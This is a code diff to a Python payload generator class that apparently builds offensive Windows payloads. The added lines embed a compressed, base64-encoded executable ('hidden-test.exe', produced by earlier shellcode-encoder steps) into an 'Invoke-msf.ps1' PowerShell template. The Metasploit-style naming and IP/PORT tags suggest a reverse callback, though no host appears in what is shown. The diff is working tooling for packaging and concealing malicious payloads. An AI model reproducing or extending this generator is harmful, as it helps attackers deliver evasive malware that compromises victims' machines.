@@ -24,6 +24,7 @@ class mypayloadgen():
         self.__payload_pstemplate = "Invoke-myclient.ps1"
         self.__psexec_pstemplate = "Invoke-psexec.ps1"
         self.__inject_pstemplate = "Invoke-inject.ps1"
+        self.__msf_pstemplate = "Invoke-msf.ps1"
 
         self.__parentdir = os.path.dirname(os.getcwd())
         self.__payload_tag = r"%%PAYLOAD%%"
@@ -33,6 +34,7 @@ class mypayloadgen():
         self.__payload_outputname = "Invoke-myclient.ps1"
         self.__psexec_outputname = "Invoke-psexec.ps1"
         self.__inject_outputname = "Invoke-inject.ps1"
+        self.__msf_outputname = "Invoke-msf.ps1"
 
         self.__compress_file_tag = r"%%filename%%"
         self.__compress_template = "Invoke-Compression.ps1"
@@ -69,6 +71,7 @@ class mypayloadgen():
         self.__msf_templete = "msf.bat"
         self.__msf_ip_tag = r"%%IP%%"
         self.__msf_port_tag = r"%%PORT%%"
+        self.__msf_toexe = "tools\\hidden-test.exe"
 
         self.__mystd = None
 
@@ -312,6 +315,25 @@ class mypayloadgen():
         subprocess.run(["shellcode-encoder.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
         subprocess.run(["conf-hidden-test.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
         subprocess.run(["hidden-test.bat"], shell=True, cwd=mycwd, stdout=self.__mystd)
+
+        #ps
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__compress_template),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_tools,self.__compress_template),mode='w') as f:
+            f.write(all_of_it.replace(self.__compress_file_tag,self.__msf_toexe))
+
+        output = subprocess.run(["psgen.bat"], capture_output=True, shell=True, cwd=mycwd)
+        myb64 = output.stdout.decode("utf-8")[:-2] #remove new line and EOF
+
+        with open(os.path.join(self.__parentdir,self.__to_template,self.__msf_pstemplate),mode='r') as f:
+            all_of_it = f.read()
+        
+        with open(os.path.join(self.__parentdir,self.__to_payload,self.__msf_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__payload_tag,myb64))
+
+        with open(os.path.join(self.__parentdir,self.__to_psdb,self.__msf_outputname),mode='w') as f:
+            f.write(all_of_it.replace(self.__payload_tag,myb64))
 
 
 if __name__ == "__main__":
